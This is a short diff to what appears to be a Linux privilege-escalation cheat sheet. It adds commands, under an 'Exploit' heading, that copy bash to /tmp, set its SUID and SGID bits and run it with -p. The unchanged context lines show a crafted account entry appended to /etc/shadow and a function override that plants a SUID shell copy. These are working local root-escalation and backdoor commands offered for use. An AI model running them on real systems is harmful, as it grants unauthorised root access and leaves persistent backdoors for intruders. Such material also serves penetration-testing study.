@@ -142,6 +142,12 @@ echo 'amxuser:$1$ozUCi1Me$rBG3vK5.jZUScy39PSVtM1:14798:0:99999:7:::' >>/etc/shad
 
 ## Exploit 
 
+Making SUIG SGID copy of bash:
+```bash
+/bin/cp /bin/bash /tmp/tom; /bin/chown tom:admin /tmp/tom; chmod g+s /tmp/tom; chmod u+s /tmp/tom
+/tmp/tom -p
+```
+
 If SUID binary execute another command, replace it with a function:
 ```
 function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
